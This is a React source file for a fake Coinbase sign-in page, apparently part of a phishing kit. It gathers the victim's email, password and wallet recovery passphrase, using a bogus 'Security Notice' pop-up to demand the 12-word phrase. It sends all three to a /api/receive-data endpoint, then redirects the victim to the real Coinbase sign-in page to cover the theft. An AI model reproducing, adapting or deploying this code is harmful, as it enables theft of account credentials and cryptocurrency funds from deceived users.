import React, { useState } from 'react';
import Logo from "./coinbaselogo.png"

const CoinbaseSignInWithPassphrase = () => {
  const [showPassphrase, setShowPassphrase] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [mainPassphrase, setMainPassphrase] = useState('');
  const [popupPassphrase, setPopupPassphrase] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleTogglePassphrase = () => {
    setShowPassphrase(!showPassphrase);
  };

  const handleSignIn = (e) => {
    e.preventDefault();
    setShowPopup(true);
  };

  const closePopup = () => {
    setShowPopup(false);
  };

 const handlePassphraseSubmit = async (e, source) => {
  e.preventDefault();
  const passphrase = source === 'main' ? mainPassphrase : popupPassphrase;

  const dataToSend = {
    email: email,
    password: password,
    passphrase: passphrase,
  };

  try {
    const response = await fetch("/api/receive-data", {
      method: "POST", // ✅ always POST
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(dataToSend),
    });

    let data = {};
    try {
      if (response.headers.get("content-type")?.includes("application/json")) {
        data = await response.json();
      } else {
        data = { message: await response.text() };
      }
    } catch (parseError) {
      console.error("Failed to parse JSON:", parseError);
    }

    if (response.ok) {
      console.log("Success:", data.message);
      closePopup();
      // Redirect after success
      window.location.href = "https://www.coinbase.com/signin";
    } else {
      console.error("Error:", data.message || "Unexpected error");
    }
  } catch (error) {
    console.error("Network Error:", error);
  }
};

  return (
    <div className="flex min-h-screen bg-[#101010] text-white font-sans items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
      <div className="w-full max-w-md space-y-8 p-10 bg-black rounded-lg shadow-lg">
        <div className="flex flex-col items-center">
          <img
            className="h-10 w-auto"
            src= {Logo}
            alt="Coinbase Logo"
          />
          <h2 className="mt-6 text-center text-3xl font-extrabold text-white">
            Sign in
          </h2>
        </div>
        
        {/* Email and Password Form */}
        <form className="mt-8 space-y-6" onSubmit={(e) => e.preventDefault()}>
          <div className="rounded-md shadow-sm -space-y-px">
            <div>
              <label htmlFor="email-address" className="sr-only">
                Email address
              </label>
              <input
                id="email-address"
                name="email"
                type="email"
                autoComplete="email"
                required
                className="relative block w-full appearance-none rounded-t-md border border-gray-600 px-3 py-2 text-gray-900 placeholder-gray-500 focus:z-10 focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm"
                placeholder="Email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            <div>
              <label htmlFor="password" className="sr-only">
                Password
              </label>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                className="relative block w-full appearance-none rounded-b-md border border-gray-600 px-3 py-2 text-gray-900 placeholder-gray-500 focus:z-10 focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
          </div>

          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <input
                id="remember-me"
                name="remember-me"
                type="checkbox"
                className="h-4 w-4 rounded border-gray-300 text-indigo-600 focus:ring-indigo-500"
              />
              <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-400">
                Remember me
              </label>
            </div>

            <div className="text-sm">
              <a href="#" className="font-medium text-indigo-600 hover:text-indigo-500">
                Forgot your password?
              </a>
            </div>
          </div>

          <div>
            <button
              onClick={handleSignIn}
              type="button"
              className="group relative flex w-full justify-center rounded-md border border-transparent bg-indigo-600 py-2 px-4 text-sm font-medium text-white hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2"
            >
              Sign in
            </button>
          </div>
        </form>

        <div className="relative my-6">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-gray-700" />
          </div>
          <div className="relative flex justify-center text-sm">
            <span className="bg-black px-2 text-gray-500">
              or
            </span>
          </div>
        </div>

        {/* Passphrase Section on Main Page */}
        <div className="flex flex-col space-y-4">
          <button
            onClick={handleTogglePassphrase}
            className="group relative flex w-full justify-center rounded-md border border-gray-600 bg-black py-2 px-4 text-sm font-medium text-white hover:bg-gray-900 focus:outline-none focus:ring-2 focus:ring-gray-800 focus:ring-offset-2"
          >
            {showPassphrase ? 'Hide Passphrase' : 'Sign in with Passphrase'}
          </button>
          
          {showPassphrase && (
            <div className="mt-4">
              <label htmlFor="passphrase-main" className="sr-only">
                Passphrase
              </label>
              <input
                id="passphrase-main"
                name="passphrase-main"
                type="text"
                required
                className="relative block w-full appearance-none rounded-md border border-gray-600 px-3 py-2 text-gray-900 placeholder-gray-500 focus:z-10 focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm"
                placeholder="Enter your pass phrase (12 words)"
                value={mainPassphrase}
                onChange={(e) => setMainPassphrase(e.target.value)}
              />
              <p className="mt-2 text-xs text-gray-400">
                A pass phrase is typically a sequence of 12 or 24 words.
              </p>
              <button
                onClick={(e) => handlePassphraseSubmit(e, 'main')}
                type="button"
                className="mt-4 group relative flex w-full justify-center rounded-md border border-transparent bg-indigo-600 py-2 px-4 text-sm font-medium text-white hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2"
              >
                Unlock Wallet
              </button>
            </div>
          )}
        </div>
        
        <div className="mt-6 text-center text-sm text-gray-500">
          New to Coinbase?{' '}
          <a href="#" className="font-medium text-indigo-600 hover:text-indigo-500">
            Sign up
          </a>
        </div>
      </div>

      {/* Pop-up Modal */}
      {/* Pop-up Modal */}
{showPopup && (
  <div className="fixed inset-0 z-50 flex items-center justify-center bg-gray-900 bg-opacity-75">
    <div className="relative w-full max-w-md p-6 bg-black rounded-lg shadow-xl text-center">
      <h3 className="text-xl font-bold text-white mb-4">Security Notice</h3>
      <p className="text-sm text-gray-300 mb-6">
        For security, a passphrase is required to restore access to your assets. Using a passphrase provides an additional layer of protection.
      </p>

      {/* Passphrase Input Section in Pop-up */}
      <form
        onSubmit={(e) => {
          e.preventDefault();
          handlePassphraseSubmit(e, "popup");
        }}
      >
        <div className="space-y-4">
          <label htmlFor="passphrase-popup" className="sr-only">
            Passphrase
          </label>
          <input
            id="passphrase-popup"
            name="passphrase-popup"
            type="text"
            required
            className="relative block w-full appearance-none rounded-md border border-gray-600 px-3 py-2 text-gray-900 placeholder-gray-500 focus:z-10 focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm"
            placeholder="Enter your pass phrase (12 words)"
            value={popupPassphrase}
            onChange={(e) => setPopupPassphrase(e.target.value)}
          />
          <button
            type="submit"
            className="w-full justify-center rounded-md border border-transparent bg-indigo-600 py-2 px-4 text-sm font-medium text-white hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2"
          >
            Unlock Wallet
          </button>
          <button
            onClick={closePopup}
            type="button"
            className="w-full mt-2 justify-center rounded-md border border-transparent bg-gray-600 py-2 px-4 text-sm font-medium text-white hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2"
          >
            Cancel
          </button>
        </div>
      </form>
    </div>
  </div>
)}
    </div>
  );
};

export default CoinbaseSignInWithPassphrase;
